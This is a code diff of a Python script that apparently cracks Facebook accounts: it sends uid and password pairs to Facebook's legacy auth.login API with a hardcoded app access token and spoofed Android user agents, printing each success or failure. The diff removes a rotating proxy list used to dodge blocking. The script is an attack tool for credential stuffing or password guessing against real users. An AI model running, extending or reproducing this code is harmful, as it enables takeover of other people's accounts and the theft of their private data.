@@ -77,16 +77,6 @@ def select_country():
 def random_ua():
     return f"Mozilla/5.0 (Linux; Android {random.randint(7,12)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,115)}.0.{random.randint(4000,5000)}.0 Mobile Safari/537.36"
 
-#----------------------------[PROXY SUPPORT]--------------------------------#
-PROXIES = [
-    "http://45.77.56.113:3128",  # Example proxy 1
-    "http://51.158.68.68:8811",  # Example proxy 2
-    "http://51.158.68.133:8811"  # Example proxy 3
-]
-
-def get_random_proxy():
-    return random.choice(PROXIES) if PROXIES else None
-
 #----------------------------[FACEBOOK LOGIN]--------------------------------#
 def facebook_login(uid, password):
     headers = {
@@ -96,14 +86,11 @@ def facebook_login(uid, password):
         "X-FB-HTTP-Engine": "Liger"
     }
     
-    proxy = get_random_proxy()
-    proxies = {"http": proxy, "https": proxy} if proxy else None
-    
     url = f"https://b-api.facebook.com/method/auth.login?email={uid}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
     
     try:
         session = requests.Session()
-        response = session.get(url, headers=headers, proxies=proxies, timeout=10).json()
+        response = session.get(url, headers=headers, timeout=10).json()
         
         if "session_key" in response:
             print(f"{G}[SUCCESS] {uid} | {password}")
@@ -114,8 +101,6 @@ def facebook_login(uid, password):
         else:
             print(f"{R}[FAILED] {uid} | {password}")
             
-    except requests.exceptions.ProxyError:
-        print(f"{R}[PROXY ERROR] Invalid or unreachable proxy: {proxy}")
     except requests.exceptions.ConnectionError:
         print(f"{R}No Internet Connection!")
     except Exception as e:
